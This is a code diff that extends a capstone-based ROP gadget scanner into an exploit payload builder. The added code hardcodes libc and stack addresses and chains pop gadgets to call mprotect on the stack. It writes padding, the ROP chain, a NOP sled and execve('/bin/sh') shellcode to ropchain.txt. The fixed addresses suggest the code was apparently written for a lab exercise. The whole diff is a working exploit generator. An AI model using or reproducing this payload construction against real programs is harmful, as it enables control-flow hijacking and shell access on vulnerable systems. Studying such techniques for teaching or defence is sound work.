@@ -2,6 +2,7 @@ import os, sys
 import collections
 import pprint
 import re
+import struct
 import platform
 from capstone import *
 from capstone.x86 import *
@@ -14,10 +15,14 @@ GADGET_TYPES = ["ret", "int"]
 BINARY_RET = "0xc3"
 JUNK = 0x41 #"A"
 FILTER_INSTR = ["enter", "leave", "push", ".byte", "call"]
+PADDING = "AAAAAAAAAAAAAAAAAAAAAAAA"
+LIBC = 0x7ffff7a0e000
 #we need gadgets to set these regs, and one to call syscall
 REQUIRED_GADGETS = ["rax", "rdi", "rsi", "rdx"]
-
-MPROTECT_ARGS = {"rax": 10, "rdi": 0xffff, "rsi": 4096, "rdx": 4} #rdi should be address of shellcode
+SHELLCODE_ADDR = 0x7fffffffe49f
+NOP = "\x90"
+SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+MPROTECT_ARGS = {"rax": 10, "rdi": 0x7fffffffe000, "rsi": 4096, "rdx": 4} #rdi should be address of shellcode
 
 class GadgetList:
     def __init__(self, logfile):
@@ -26,12 +31,15 @@ class GadgetList:
         self.size = 0
         self.out = logfile
         self.useful_gadgets = dict()
+        self.popret = dict()
         for t in GADGET_TYPES:
             self.gadgets[t] = list()
 
         for g in REQUIRED_GADGETS:
+            self.popret[g] = None
             self.useful_gadgets[g] = list()
         self.useful_gadgets["syscall"] = list()
+        self.popret["syscall"] = None
 
     def serializeInstructions(self, gadget):
         seq = list()
@@ -109,11 +117,19 @@ class GadgetList:
 
         syscall = self.useful_gadgets["syscall"][0]
         print(self.getGadgetInfo(syscall))
-        stack.append(syscall[0][0])
+        stack.append(syscall[0][0] + LIBC)
 
         print("\nSTACK:")
-        for addr in stack:
-            print("0x%x" % int(addr))
+        with open("ropchain.txt", "wb") as f:
+            f.write(PADDING)
+            for addr in stack:
+                print("0x%x" % int(addr))
+                f.write(struct.pack("<Q", int(addr)))
+            f.write(struct.pack("<Q", SHELLCODE_ADDR))
+            nopsled = NOP * 25
+            f.write(nopsled)
+            f.write(SHELLCODE)
+
 
     def formatPopArgs(self, gadget, register):
         if register not in MPROTECT_ARGS:
@@ -121,7 +137,7 @@ class GadgetList:
             sys.exit(1)
 
         stack = []
-        stack.append(gadget[0][0]) #address
+        stack.append(gadget[0][0] + LIBC) #address
         stack.append(MPROTECT_ARGS[register])
         for g in gadget[1:]:
             if g[1] == "pop":
@@ -185,12 +201,15 @@ class GadgetList:
             info = self.getGadgetInfo(g)
 
             if i[1] == "pop" and i[2].lower() in REQUIRED_GADGETS:
+                if len(g) == 2:
+                    self.popret[i[2].lower()] = g
                 self.useful_gadgets[i[2].lower()].append(g)
                 self.set.add(seq)
                 print("[*] Found %s Gadget (%s)" % (i[2], info))
 
             if i[1] == "syscall" and len(g) == 2: #try to find just syscall ; ret
                 self.useful_gadgets["syscall"].append(g)
+                self.popret["syscall"] = g
                 self.set.add(seq)
                 print("[*] Found syscall Gadget (%s)" % info)
                 return
@@ -236,6 +255,12 @@ class GadgetList:
         addr = "0x%x:" % baseAddr
         return addr + s
 
+    def isReady(self):
+        for key, val in self.popret.iteritems():
+            if self.popret[key] == None:
+                return False
+        return True
+
 class GadgetScanner:
     def __init__(self, d, glist):
         self.data = d
@@ -280,6 +305,8 @@ class GadgetScanner:
                 continue
             #print("scanning %d->%d" % (start, end))
             self.scanSection(data[start:end], start)
+            if self.gadgetList.isReady():
+                return
 
     def scanSection(self, blob, offset):
         md = self.initScanner()
